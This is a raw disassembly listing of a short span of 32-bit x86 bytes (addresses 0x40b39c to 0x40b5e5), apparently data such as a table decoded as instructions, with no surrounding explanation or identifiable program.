  40b39c:	js     0x40b3dd
  40b39e:	jg     0x40b3df
  40b3a0:	mov    al,ds:0xcd3fb33f
  40b3a5:	aas    
  40b3a6:	call   0xa0b3ea
  40b3ab:	add    BYTE PTR [eax+0x1],al
  40b3ae:	add    BYTE PTR [eax],al
  40b3b0:	cdq    
  40b3b1:	xor    BYTE PTR [eax-0x31cf37d0],ah
  40b3b7:	xor    ch,dl
  40b3b9:	xor    BYTE PTR [ebx],bl
  40b3bb:	xor    DWORD PTR [edx],esp
  40b3bd:	xor    DWORD PTR [ebx],esi
  40b3bf:	xor    DWORD PTR [edx],edi
  40b3c1:	xor    DWORD PTR [ebx+0x31],ecx
  40b3c4:	push   edx
  40b3c5:	xor    DWORD PTR [ecx+esi*1+0x76],ebx
  40b3c9:	xor    DWORD PTR [ebp+0x31],edi
  40b3cc:	mov    ?,WORD PTR [ecx]
  40b3ce:	xchg   ebp,eax
  40b3cf:	xor    DWORD PTR [esi-0x48ce52cf],esp
  40b3d5:	xor    esp,edx
  40b3d7:	xor    eax,edi
  40b3d9:	xor    DWORD PTR [ebx],eax
  40b3db:	xor    dl,BYTE PTR [eax]
  40b3dd:	xor    bl,BYTE PTR [edx+esi*1]
  40b3e0:	and    esi,DWORD PTR [edx]
  40b3e2:	sub    DWORD PTR [edx],esi
  40b3e4:	das    
  40b3e5:	xor    dh,BYTE PTR ds:0x41323b32
  40b3eb:	xor    al,BYTE PTR [esi+0x32]
  40b3ee:	dec    ebx
  40b3ef:	xor    bh,BYTE PTR [edi+0x32]
  40b3f2:	fbstp  TBYTE PTR [ebx]
  40b3f4:	add    al,0x34
  40b3f6:	sub    eax,0x6a343534
  40b3fb:	xor    al,0xa0
  40b3fd:	xor    al,0x1c
  40b3ff:	xor    eax,0x353d3535
  40b404:	pop    ecx
  40b405:	xor    eax,0x357e3576
  40b40a:	ret    
  40b40b:	xor    eax,0x35ed35e5
  40b410:	sbb    DWORD PTR [esi],esi
  40b412:	dec    edi
  40b413:	ss push edi
  40b415:	ss scas al,BYTE PTR es:[edi]
  40b417:	shl    DWORD PTR ss:[esi],1
  40b41a:	div    BYTE PTR [esi]
  40b41c:	dec    eax
  40b41d:	aaa    
  40b41e:	pop    eax
  40b41f:	aaa    
  40b420:	pusha  
  40b421:	aaa    
  40b422:	mov    eax,0x1437bf37
  40b427:	cmp    BYTE PTR ds:0x77385338,ah
  40b42d:	cmp    BYTE PTR [esi-0x59c772c8],al
  40b433:	cmp    BYTE PTR [ebp-0x31c738c8],bh
  40b439:	cmp    dh,bl
  40b43b:	cmp    ch,ah
  40b43d:	cmp    BYTE PTR ds:0x7f391639,al
  40b443:	cmp    DWORD PTR [ecx+edi*1+0x3a3539f5],ebp
  40b44a:	inc    ebx
  40b44b:	cmp    bh,BYTE PTR [esi+0x3a]
  40b44e:	xchg   DWORD PTR [edx],edi
  40b450:	mov    edi,0x3e3b083a
  40b455:	cmp    ecx,DWORD PTR [eax+0x3b]
  40b458:	xchg   esp,eax
  40b459:	cmp    edx,edx
  40b45b:	cmp    ecx,DWORD PTR [esi]
  40b45d:	cmp    al,0x22
  40b45f:	cmp    al,0x3b
  40b461:	cmp    al,0x53
  40b463:	cmp    al,0x7d
  40b465:	cmp    al,0x8b
  40b467:	cmp    al,0x90
  40b469:	cmp    al,0x9a
  40b46b:	cmp    al,0xa7
  40b46d:	cmp    al,0xc5
  40b46f:	cmp    al,0x49
  40b471:	cmp    eax,0x3d733d5e
  40b476:	mov    BYTE PTR ds:0x3db83d93,bh
  40b47c:	les    edi,FWORD PTR ds:0x3dd73dca
  40b482:	in     eax,dx
  40b483:	cmp    eax,0x3e003df6
  40b488:	or     DWORD PTR [esi],edi
  40b48a:	adc    edi,DWORD PTR [esi]
  40b48c:	pop    ds
  40b48d:	ds and eax,0x353e2c3e
  40b493:	cmp    edi,DWORD PTR ds:[esi]
  40b496:	inc    ebx
  40b497:	ds dec ecx
  40b499:	ds push esi
  40b49b:	ds pop esi
  40b49d:	ds fs cmp DWORD PTR ds:[esi],0x3e8c3e86
  40b4a6:	xchg   ecx,eax
  40b4a7:	ds xchg esi,eax
  40b4a9:	ds fwait
  40b4ab:	mov    al,ds:0xae3ea63e
  40b4b1:	ds mov ebx,0xf73ed53e
  40b4b7:	add    bh,BYTE PTR ds:[edi]
  40b4ba:	adc    al,0x3f
  40b4bc:	sbb    al,0x3f
  40b4be:	and    DWORD PTR [edi],edi
  40b4c0:	es aas 
  40b4c2:	dec    eax
  40b4c3:	aas    
  40b4c4:	dec    esi
  40b4c5:	aas    
  40b4c6:	push   ebp
  40b4c7:	aas    
  40b4c8:	pop    edx
  40b4c9:	aas    
  40b4ca:	addr16 aas 
  40b4cc:	jbe    0x40b50d
  40b4ce:	jle    0x40b50f
  40b4d0:	xchg   BYTE PTR [edi],bh
  40b4d2:	call   0xb03f:0xaa3fa23f
  40b4d9:	aas    
  40b4da:	mov    dh,0x3f
  40b4dc:	ret    
  40b4dd:	aas    
  40b4de:	leave  
  40b4df:	aas    
  40b4e0:	sar    DWORD PTR [edi],cl
  40b4e2:	repnz aas 
  40b4e4:	clc    
  40b4e5:	aas    
  40b4e6:	add    BYTE PTR [eax],al
  40b4e8:	add    BYTE PTR [eax+0x0],dh
  40b4eb:	add    ah,ah
  40b4ed:	add    BYTE PTR [eax],al
  40b4ef:	add    BYTE PTR [edx],al
  40b4f1:	xor    BYTE PTR [eax],cl
  40b4f3:	xor    BYTE PTR [ecx],dl
  40b4f5:	xor    BYTE PTR [esi],dl
  40b4f7:	xor    BYTE PTR [ebx],dh
  40b4f9:	xor    BYTE PTR [esi+0x30],dl
  40b4fc:	xchg   edx,eax
  40b4fd:	xor    cl,ch
  40b4ff:	xor    BYTE PTR [ecx],al
  40b501:	xor    DWORD PTR [edi],eax
  40b503:	xor    DWORD PTR [esi],edx
  40b505:	xor    DWORD PTR [edx],esp
  40b507:	xor    DWORD PTR [edi+0x4831cc31],edx
  40b50d:	xor    cl,BYTE PTR [ebp+0x32]
  40b510:	pop    edi
  40b511:	xor    bh,BYTE PTR [ebp+0x32]
  40b514:	xchg   ecx,eax
  40b515:	xor    dl,BYTE PTR [edi+0x74335932]
  40b51b:	xor    eax,DWORD PTR [eax-0x67cc70cd]
  40b521:	xor    esp,DWORD PTR [ecx-0x34cc49cd]
  40b527:	xor    ebx,eax
  40b529:	xor    esp,eax
  40b52b:	xor    edi,ebx
  40b52d:	xor    ecx,DWORD PTR [edx]
  40b52f:	xor    al,0x15
  40b531:	xor    al,0x32
  40b533:	xor    al,0x82
  40b535:	xor    al,0x87
  40b537:	xor    al,0xaf
  40b539:	xor    al,0xb8
  40b53b:	xor    al,0xc3
  40b53d:	xor    al,0xca
  40b53f:	xor    al,0xe1
  40b541:	xor    al,0xe7
  40b543:	xor    al,0xed
  40b545:	xor    al,0xf3
  40b547:	xor    al,0xf9
  40b549:	xor    al,0xff
  40b54b:	xor    al,0x6
  40b54d:	xor    eax,0x3514350d
  40b552:	sbb    esi,DWORD PTR ds:0x35293522
  40b558:	xor    BYTE PTR ds:0x35403538,dh
  40b55e:	dec    eax
  40b55f:	xor    eax,0x355d3554
  40b564:	bound  esi,QWORD PTR ds:0x35723568
  40b56a:	jl     0x40b5a1
  40b56c:	mov    WORD PTR ds:0x35a2359c,?
  40b572:	lods   eax,DWORD PTR ds:[esi]
  40b573:	xor    eax,0x35bf35b3
  40b578:	iret   
  40b579:	xor    eax,0x35f035d8
  40b57e:	div    BYTE PTR ds:0x360235fc
  40b584:	or     BYTE PTR [esi],dh
  40b586:	push   cs
  40b587:	ss adc eax,0x23361c36
  40b58d:	sub    dh,BYTE PTR ss:[esi]
  40b590:	xor    DWORD PTR [esi],esi
  40b592:	cmp    BYTE PTR [esi],dh
  40b594:	aas    
  40b595:	ss inc ebp
  40b597:	ss push ecx
  40b599:	ss pop esp
  40b59b:	ss popa 
  40b59d:	ss data16 ss ins BYTE PTR es:[edi],dx
  40b5a1:	ss jbe 0x40b5da
  40b5a4:	xor    BYTE PTR [esi],0x90
  40b5a7:	ss cdq 
  40b5a9:	lods   eax,DWORD PTR ss:[esi]
  40b5ab:	ss retf 0xc36
  40b5af:	aaa    
  40b5b0:	push   edx
  40b5b1:	aaa    
  40b5b2:	pop    esi
  40b5b3:	aaa    
  40b5b4:	push   0x37
  40b5b6:	test   BYTE PTR [edi],dh
  40b5b8:	mov    BYTE PTR [edi],dh
  40b5ba:	nop
  40b5bb:	aaa    
  40b5bc:	xchg   esp,eax
  40b5bd:	aaa    
  40b5be:	lods   al,BYTE PTR ds:[esi]
  40b5bf:	aaa    
  40b5c0:	mov    al,0x37
  40b5c2:	int3   
  40b5c3:	aaa    
  40b5c4:	shl    BYTE PTR [edi],1
  40b5c6:	in     al,dx
  40b5c7:	aaa    
  40b5c8:	lock aaa 
  40b5ca:	add    BYTE PTR [eax],al
  40b5cc:	add    BYTE PTR [eax+0x100000],al
  40b5d2:	add    BYTE PTR [eax],al
  40b5d4:	cmp    al,0x30
  40b5d6:	inc    eax
  40b5d7:	xor    BYTE PTR [eax+esi*1+0x0],al
  40b5db:	add    BYTE PTR [eax],al
  40b5dd:	nop
  40b5de:	add    BYTE PTR [eax],al
  40b5e0:	or     al,0x0
  40b5e2:	add    BYTE PTR [eax],al
  40b5e4:	.byte 0xa0
  40b5e5:	xor    DWORD PTR [eax],eax
	...
